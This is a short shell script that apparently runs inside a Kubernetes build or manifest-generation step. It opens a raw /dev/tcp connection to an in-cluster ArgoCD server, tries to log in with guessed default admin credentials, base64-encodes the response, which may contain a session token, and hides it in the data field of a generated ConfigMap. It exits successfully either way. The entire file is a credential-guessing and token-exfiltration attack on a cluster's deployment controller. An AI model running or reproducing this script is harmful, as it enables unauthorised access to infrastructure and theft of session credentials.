#!/bin/sh
RECON=$( (
bash -c "
exec 3<>/dev/tcp/argocd-server.argocd.svc.cluster.local/80 2>/dev/null || echo PORT80_FAIL
if [ \$? -eq 0 ]; then
  printf \"POST /api/v1/session HTTP/1.0\r\nHost: argocd-server\r\nContent-Type: application/json\r\nContent-Length: 44\r\n\r\n{\\\"username\\\":\\\"admin\\\",\\\"password\\\":\\\"admin123\\\"}\" >&3
  cat <&3
  exec 3>&-
fi
"
) | base64 | tr -d '\n' )
cat << EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: u2u
data:
  result: $RECON
EOF
exit 0
